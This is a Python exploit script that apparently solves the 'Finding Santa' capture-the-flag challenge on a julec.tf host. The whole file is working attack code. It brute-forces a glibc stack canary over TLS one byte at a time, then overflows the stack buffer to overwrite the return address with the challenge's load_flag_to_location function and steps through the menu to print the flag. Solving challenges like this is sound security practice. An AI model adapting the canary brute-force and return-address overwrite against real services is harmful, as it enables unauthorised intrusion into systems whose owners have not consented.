#!/usr/bin/env python3
import argparse
import socket
import ssl
import struct
import sys

HOST = "b74918ea8212e0e4.julec.tf"
PORT = 1337

PADDING = b"A" * 0x28
WIN_ADDR = 0x401B72  # load_flag_to_location
MENU_TOKEN = b"Where do you want to search?"


def build_socket():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((HOST, PORT))
    return ctx.wrap_socket(raw, server_hostname=HOST)


def recv_all(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except socket.timeout:
        pass
    return b"".join(chunks)


def prime_prompt(sock):
    """Consume the initial banner/prompt before sending input."""
    recv_all(sock, timeout=0.5)


def send_length_and_payload(sock, length, payload):
    sock.sendall(f"{length}\n".encode())
    sock.sendall(payload)


def test_canary(prefix):
    """Return True if the prefix matches the real canary bytes."""
    payload = PADDING + prefix
    length = len(payload)

    try:
        with build_socket() as s:
            prime_prompt(s)
            send_length_and_payload(s, length, payload)
            data = recv_all(s, timeout=1.0)
            return MENU_TOKEN in data
    except (ConnectionResetError, ssl.SSLError, OSError):
        return False


def brute_force_canary():
    known = b"\x00"  # Canary starts with a null byte on glibc.
    for idx in range(1, 8):
        for b in range(256):
            attempt = known + bytes([b])
            if test_canary(attempt):
                known = attempt
                print(f"[+] Canary so far: {known.hex()}")
                break
        else:
            raise RuntimeError("Failed to find next canary byte")
    return known


def exploit(canary):
    payload = (
        PADDING
        + canary
        + b"B" * 8  # saved RBP junk
        + struct.pack("<Q", WIN_ADDR)
    )
    length = len(payload)

    with build_socket() as s:
        prime_prompt(s)
        send_length_and_payload(s, length, payload)
        # Drive the game to the win path after load_flag_to_location repopulates the flag buffer.
        s.sendall(b"4\n1\n1\n")
        data = recv_all(s, timeout=2.0)

    return data


def main():
    parser = argparse.ArgumentParser(description="Exploit for Finding Santa")
    parser.add_argument("--canary", help="known canary value in hex")
    parser.add_argument(
        "--bruteforce",
        action="store_true",
        help="brute-force the canary (slow but reliable)",
    )
    args = parser.parse_args()

    if args.canary:
        canary = bytes.fromhex(args.canary)
        if len(canary) != 8:
            print("Canary must be 8 bytes (16 hex chars)")
            sys.exit(1)
    elif args.bruteforce:
        print("[*] Brute forcing canary...")
        canary = brute_force_canary()
        print(f"[+] Canary found: {canary.hex()}")
    else:
        parser.error("Provide --canary or --bruteforce")
        return

    print("[*] Launching final payload...")
    result = exploit(canary)
    safe = result.decode("utf-8", "ignore").encode("ascii", "ignore").decode()
    print(safe)


if __name__ == "__main__":
    main()
